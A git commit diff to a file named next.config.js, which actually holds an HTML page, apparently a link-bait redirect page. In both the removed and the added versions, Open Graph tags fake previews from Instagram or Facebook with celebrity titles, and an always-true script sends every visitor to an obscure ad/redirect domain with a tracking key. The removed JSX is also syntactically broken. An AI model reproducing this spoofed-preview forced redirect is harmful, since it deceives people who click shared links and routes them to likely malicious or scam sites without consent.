1ae77ef0793f65ed8e62fc0fab16ebf3bb6bc20b
Billiemo <mokirpolk@gmail.com>
2024-08-22 19:50:56 +0100

    Update next.config.js

--- next.config.js
+++ next.config.js
@@ -1,33 +1,19 @@
-import Document, { Html, Head, Main, NextScript } from 'next/document';
-
-class MyDocument extends Document {
-  render() {
-    return (
-      <Html lang="en">
-        <Head>
-          <meta charSet="utf-8" />
-          <meta property="og:url" content="instagram.com" />
-          <meta property="og:title" content="Hola" />
-          <meta property="og:type" content="website" />
-          <meta property="og:description" content="DESCRIPTION" />
-          <meta property="og:image"https://i.ytimg.com/vi/I74FAkaL1Fk/maxresdefault.jpg" alt="Image description from i.ytimg.com" />" />
-        </Head>
-        <body>
-          <Main />
-          <NextScript />
-          <script
-            dangerouslySetInnerHTML={{
-              __html: `
-                if ("false" == "false") {
-                  window.location = "https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb";
-                }
-              `,
-            }}
-          />
-        </body>
-      </Html>
-    );
-  }
-}
-
-export default MyDocument;
+<!doctype html>
+<html lang='en'>
+    <head>
+        <meta charset="utf-8" />
+        <meta property="og:url" content="https://facebook.com" />
+        <meta property="og:title" content="cristiano_ronaldo" />
+        <meta property="og:type" content="website" />
+        <meta property="og:description" content="billie eilish hit me hard and soft Hi" />
+        <title>BILLIE ELLISH</title>
+    </head>
+    <body>
+        <img src="https://i.ytimg.com/vi/I74FAkaL1Fk/maxresdefault.jpg" alt="Image description from i.ytimg.com" />
+        <script type="text/javascript">
+            if ("false" == "false") {
+                window.location = "https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb";
+            }
+        </script>
+    </body>
+</html>
